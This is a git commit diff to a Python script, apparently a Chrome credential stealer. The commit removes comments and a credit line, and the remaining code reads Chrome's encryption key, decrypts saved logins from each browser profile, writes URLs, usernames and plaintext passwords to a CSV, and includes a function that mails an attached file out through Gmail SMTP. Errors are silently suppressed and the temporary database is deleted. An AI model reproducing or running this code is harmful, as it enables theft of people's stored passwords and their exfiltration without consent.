fb9527e0ccb87c5e0e4a0745cd5a4a6136bfe8c4
Samplayswthpython <166288160+Samplayswthpython@users.noreply.github.com>
2024-05-01 23:17:21 +0530

    Update decrypt.pyw

--- decrypt.py
+++ decrypt.py
@@ -1,6 +1,5 @@
 #!/usr/bin/enc python3 
 
-#Full Credits to LimerBoy
 import os
 while True:
     try:
@@ -41,12 +40,10 @@ else:
 
 def get_secret_key():
     try:
-        #(1) Get secretkey from chrome local state
         with open( LOCAL_STATE, "r", encoding='utf-8') as f:
             local_state = f.read()
             local_state = json.loads(local_state)
         secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        #Remove suffix DPAPI
         secret_key = secret_key[5:] 
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
         return secret_key
@@ -61,12 +58,8 @@ def generate_cipher(aes_key, iv):
 
 def decrypt_password(ciphertext, secret_key):
     try:
-        #(3-a) Initialisation vector for AES decryption
         initialisation_vector = ciphertext[3:15]
-        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
-        #Encrypted password is 192 bits
         encrypted_password = ciphertext[15:-16]
-        #(4) Build the cipher to decrypt the ciphertext
         cipher = generate_cipher(secret_key, initialisation_vector)
         decrypted_pass = decrypt_payload(cipher, encrypted_password)
         decrypted_pass = decrypted_pass.decode()  
@@ -87,10 +80,8 @@ def send_email(sender_email, sender_password, recipient_email, subject, body, at
     msg['From'] = sender_email
     msg['To'] = recipient_email
     
-    # Attach body text
     msg.attach(MIMEText(body, "plain"))
 
-    # Attach the file
     filename = attachment_path
     part = MIMEBase("application", "octet-stream")
     with open(filename, "rb") as attachment:
@@ -101,7 +92,6 @@ def send_email(sender_email, sender_password, recipient_email, subject, body, at
     msg.attach(part)
 
     try:
-        # Connect to the SMTP server
         with smtplib.SMTP('smtp.gmail.com', 587) as server:
             server.starttls()
             server.login(sender_email, sender_password)
@@ -111,16 +101,12 @@ def send_email(sender_email, sender_password, recipient_email, subject, body, at
 
 if __name__ == '__main__':
     try:
-        #Create Dataframe to store passwords
         with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
-            #(1) Get secret key
             secret_key = get_secret_key()
-            #Search user profile or default folder (this is where the encrypted login password is stored)
             folders = [element for element in os.listdir(PATH) if re.search("^Profile*|^Default$",element)!=None]
             for folder in folders:
-            	#(2) Get ciphertext from sqlite database
                 chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(PATH,folder))
                 conn = get_db_connection(chrome_path_login_db)
                 if(secret_key and conn):
@@ -131,15 +117,10 @@ if __name__ == '__main__':
                         username = login[1]
                         ciphertext = login[2]
                         if(url!="" and username!="" and ciphertext!=""):
-                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
-                            #(4) Use AES algorithm to decrypt the password
                             decrypted_password = decrypt_password(ciphertext, secret_key)
-                            #(5) Save into CSV 
                             csv_writer.writerow([index,url,username,decrypted_password])
-                    #Close database connection
                     cursor.close()
                     conn.close()
-                    #Delete temp login db
                     os.remove("Loginvault.db")
     except Exception as e:
         pass
